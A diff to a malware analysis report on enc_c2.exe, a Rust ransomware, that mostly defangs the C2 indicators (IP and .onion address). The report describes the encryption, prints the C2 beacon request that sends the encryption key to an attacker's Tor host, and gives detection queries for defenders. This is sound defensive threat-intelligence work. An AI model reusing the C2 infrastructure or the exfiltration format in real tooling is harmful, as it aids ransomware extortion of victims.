@@ -24,7 +24,7 @@ hide: true
 
 # enc_c2.exe - Rust-Based Ransomware Analysis
 
-**Campaign Identifier:** Arsenal-237-New-Files-109.230.231.37
+**Campaign Identifier:** Arsenal-237-New-Files-109[.]230[.]231[.]37
 
 ---
 
@@ -82,7 +82,7 @@ enc_c2.exe is a critical-severity Rust-based ransomware from the Arsenal-237 too
 - **What This Malware Enables:** Complete file encryption across target directories with attacker-controlled decryption monopoly via Tor C2 infrastructure; RaaS architecture with builder tracking enables multi-campaign operations
 - **Why This Threat Is Significant:** Modern Rust implementation with professional cryptographic libraries (ChaCha20 via aead-0.5.2), sophisticated Tor-based anonymity infrastructure, and RaaS operational model indicate organized threat actors with serious development capabilities
 - **Critical Capability 1:** ChaCha20 stream cipher encryption with .locked extension appending ensures cryptographically secure data loss without attacker cooperation
-- **Critical Capability 2:** Tor hidden service C2 communication (http://rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion/c2/beacon.php) provides attacker anonymity and infrastructure resilience
+- **Critical Capability 2:** Tor hidden service C2 communication (hxxp://rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion/c2/beacon.php) provides attacker anonymity and infrastructure resilience
 - **Critical Capability 3:** Encryption key exfiltration via JSON payload ensures attacker maintains exclusive decryption capability for ransom leverage
 
 **Organizational Guidance:**
@@ -97,7 +97,7 @@ enc_c2.exe is a critical-severity Rust-based ransomware from the Arsenal-237 too
 **For Technical Teams:**
 - **URGENTLY:** Deploy network monitoring for Tor connectivity (outbound connections to known Tor entry nodes, .onion domain access attempts)
 - Implement behavioral detection for rapid file encryption patterns (large write volumes with .locked extension appending, README.txt ransom note creation)
-- Conduct immediate threat hunt for IOC presence: enc_c2.exe file hash (SHA256: 613d4d0f...), TEST_BUILD_001 builder string, C2 domain rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion
+- Conduct immediate threat hunt for IOC presence: enc_c2.exe file hash (SHA256: 613d4d0f...), TEST_BUILD_001 builder string, C2 domain rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion
 - Review and test backup restoration procedures - this is the primary recovery mechanism
 - Deploy YARA rules and Sigma detection rules (see Detection Rules section) to EDR, SIEM, and network monitoring systems
 - Verify endpoint detection and response (EDR) coverage and alert tuning for file encryption patterns
@@ -127,7 +127,7 @@ ChaCha20 is cryptographically secure, so brute force and cryptanalysis are both 
 ### Infrastructure Analysis & OSINT Findings
 
 **Tor Hidden Service C2 Domain:**
-- **Address:** rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion
+- **Address:** rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion
 - **Endpoint:** /c2/beacon.php
 - **Protocol:** HTTP POST
 - **OSINT Profile:** Hidden service infrastructure is commodity; many ransomware families utilize similar Tor-based architecture for anonymity. HIGH CONFIDENCE that this domain is active C2 infrastructure designed to receive victim registration beacons and potentially deliver secondary commands or decryption keys post-payment.
@@ -181,7 +181,7 @@ Calculated as weighted average: Data Loss (20%) + Key Compromise (20%) + Operati
 - [new_enc.exe Ransomware]({{ "/reports/new-enc-exe/" | relative_url }}) - Alternative ransomware variant
 - [full_test_enc.exe Advanced Ransomware]({{ "/reports/arsenal-237-new-files/full_test_enc-exe/" | relative_url }}) - Most advanced ransomware variant
 - [dec_fixed.exe Decryptor]({{ "/reports/arsenal-237-new-files/dec_fixed-exe/" | relative_url }}) - Victim-specific decryptor
-- [Arsenal-237 Executive Overview]({{ "/reports/109.230.231.37-Executive-Overview/" | relative_url }}) - Full toolkit analysis
+- [Arsenal-237 Executive Overview]({{ "/reports/109[.]230[.]231[.]37-Executive-Overview/" | relative_url }}) - Full toolkit analysis
 
 ---
 ## Section 1: Malware Classification & Identification
@@ -442,7 +442,7 @@ Before, during, or immediately after file encryption, enc_c2.exe transmits the 2
 
 ```
 Protocol: HTTP over Tor
-Domain: rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion
+Domain: rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion
 Endpoint: /c2/beacon.php
 Port: 80 (HTTP, standard web traffic)
 Transport: Tor network (provides encryption + anonymity)
@@ -452,7 +452,7 @@ Transport: Tor network (provides encryption + anonymity)
 
 ```http
 POST /c2/beacon.php HTTP/1.1
-Host: rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion
+Host: rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion
 Content-Type: application/json
 User-Agent: [ureq-2.12.1 library default UA]
 Connection: close
@@ -494,7 +494,7 @@ The encryption key exfiltration is the **SINGLE POINT OF FAILURE** for the entir
 **OSINT: Tor Hidden Service Profiling**
 
 **Domain Analysis:**
-- **Address:** rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion
+- **Address:** rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion
 - **Infrastructure Type:** Tor hidden service (commodity infrastructure)
 - **Anonymity Level:** HIGH - Tor provides protection against geographic/ISP-level identification
 - **Resilience:** Hidden service infrastructure has no centralized servers; difficult for law enforcement to disrupt
@@ -595,7 +595,7 @@ enc_c2.exe implements ransomware-as-a-service operational model with affiliate t
 **Command-Line Configuration Options:**
 
 ```bash
-enc_c2.exe [OPTIONS]
+[e]nc_c2.exe [OPTIONS]
 
 Options:
   --folder <path>           Target directory for encryption (e.g., C:\Users\Victim\Documents)
@@ -611,7 +611,7 @@ Options:
 **Default Configuration:**
 
 ```yaml
-C2_URL: "http://rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion/c2/beacon.php"
+C2_URL: "hxxp://rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion/c2/beacon.php"
 BUILDER_ID: "TEST_BUILD_001"
 TARGET_FOLDER: "[Current directory or system-wide enumeration]"
 VICTIM_ID: "[Auto-generated - mechanism unknown]"
@@ -741,7 +741,7 @@ enc_c2.exe follows a structured attack chain from initial execution through data
 **Step 3: Configuration & Argument Parsing (1-2 seconds)**
 - Main function (sub_140006c40) parses command-line arguments
 - **If default configuration:** Uses hardcoded values
-  - C2 URL: http://rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion/c2/beacon.php
+  - C2 URL: hxxp://rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion/c2/beacon.php
   - Builder ID: TEST_BUILD_001
   - Target folder: [Current directory or system-wide scan]
 - **If custom arguments:** Override defaults with specified values
@@ -770,7 +770,7 @@ enc_c2.exe follows a structured attack chain from initial execution through data
   }
   ```
 - Establishes connection to Tor hidden service (localhost:9050/9150 SOCKS proxy or embedded Tor client)
-- Sends HTTP POST request to rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion/c2/beacon.php
+- Sends HTTP POST request to rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion/c2/beacon.php
 - **CRITICAL OUTCOME:** Attacker receives encryption key; now maintains exclusive decryption capability
 - **Error Handling:** [Unknown - requires dynamic analysis]
 
@@ -1073,7 +1073,7 @@ Implementation:
   - DNS query monitoring (DNS requests for .onion domains)
   - TLS SNI monitoring (Client Hello packets with .onion SNI)
 Alert Threshold: Single .onion domain access = MEDIUM severity
-Alert Threshold: rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion = CRITICAL severity
+Alert Threshold: rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion = CRITICAL severity
 ```
 
 **SOCKS Proxy Activity Detection:**
@@ -1154,7 +1154,7 @@ Process (enc_c2.exe or suspicious parent) writing .locked files
 
 Stage 3: C2 Communication (Optional but High-Value)
 ```
-Outbound HTTP POST to rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd.onion
+Outbound HTTP POST to rustydl5ak6p6ajqnja6qzkxvp5huhe4olpdsq5oy75ea4o34aalpkqd[.]onion
   -> Log source: Proxy logs, NetFlow, network monitoring
   -> Time correlation: Same timestamp or within 1 minute of file encryption start
   -> HTTP body contains: JSON payload with encryption_key, victim_id, builder_id fields
@@ -1172,6 +1172,7 @@ index=sysmon EventID=1 CommandLine="*enc_c2.exe*" OR Image="*enc_c2.exe"
   | where _time > exec_window | stats count as locked_files by host]
 | where locked_files > 50
 ```
+{: .hl-copy}
 
 ---
 
